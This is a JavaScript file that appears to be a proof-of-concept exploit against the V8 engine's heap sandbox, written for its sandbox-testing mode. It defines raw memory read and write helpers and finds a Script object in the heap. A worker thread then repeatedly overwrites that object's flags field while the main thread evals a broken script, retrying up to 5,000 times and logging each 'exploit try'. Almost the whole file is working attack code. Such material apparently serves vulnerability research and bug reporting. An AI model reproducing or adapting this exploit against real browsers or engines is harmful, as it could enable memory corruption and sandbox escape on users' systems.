// --sandbox-testing
const kHeapObjectTag = 1;
const kScriptMap = 0x13d5;
const kJSFunctionSharedFunctionInfoOffset = 0x10;
const kJSharedFunctionInfoScriptOffset = 0x14;
const kScriptFlagsOffset = 0x34;
const kSmiTagSize = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ptr) {
  return Sandbox.getObjectAt(ptr);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}
function findObject(start, needle) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

const MAX_TRIES = 5000;

let workerScript = `
  // Prepare corruption utilities.
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

  this.onmessage = (msg) => {
    let {ofs, val, rep, id, doit} = msg.data;
    if (doit) {
      for (let i = 0; i < rep; i++) {
        memory.setUint32(ofs, val, true);
      }
    }
    this.postMessage({id});
  }
`;
let worker = new Worker(workerScript, {type: 'string'});

function EvalConstructNonConstructor() {
  EvalConstructNonConstructor.id = (EvalConstructNonConstructor.id ?? 10000) + 1;
  try {
    eval(`new ${EvalConstructNonConstructor.id}`);
  } catch (e) {}
}

function GetNewFunction() {
  GetNewFunction.id = (GetNewFunction.id ?? 10000) + 1;
  return new Function(`return '${GetNewFunction.id}';`);
}

let id;
let last_ofs = 0;
let last_rep = 0;
let fns = [];
exp_call = () => {
  ///// GC & ALLOC SENSITIVE /////
  gc();
  let fn = GetNewFunction();
  fns.push(fn);
  let pref = getField(getField(getPtr(fn), kJSFunctionSharedFunctionInfoOffset), kJSharedFunctionInfoScriptOffset);

  worker.postMessage({
    ofs: pref + last_ofs - kHeapObjectTag + kScriptFlagsOffset,
    val: 0b101 << kSmiTagSize,
    rep: 10000,   // once seems to be still enough (likely due to ipc?)
    id: id + 1,
    doit: last_rep >= MAX_TRIES / 5,
  });

  // eval broken script
  EvalConstructNonConstructor();
  ///// GC & ALLOC SENSITIVE /////

  // resolve stable offset automatically
  let ptgt = findObject(pref + 4, [kScriptMap]);
  let this_ofs = ptgt - pref;
  // console.log(`[*] ref:    ${pref.toString(16)}`);
  // console.log(`[*] Script: ${ptgt.toString(16)}`);
  // console.log(`[*] offset: ${this_ofs.toString(16)}`);
  if (last_rep < MAX_TRIES / 5) {
    if (last_ofs === this_ofs) {
      last_rep += 1;
    } else {
      last_ofs = this_ofs;
      last_rep = 0;
    }
  }
};

worker.onmessage = (msg) => {
  id = msg.data.id;
  if (id === 0) {
    console.log(`[*] worker warm-up done, starting exploit`);

    worker.postMessage({rep: 0, id: 1});
  } else if (id >= 1 && id <= MAX_TRIES) {
    if (id % 100 === 0) {
      console.log(`[*] exploit try ${id}`);
    }
    exp_call();
  } else {
    console.log(`[*] max tries exhausted, terminating worker`);
    worker.terminate();
  }
}

// launch event chain
worker.postMessage({id: 0, doit: false});
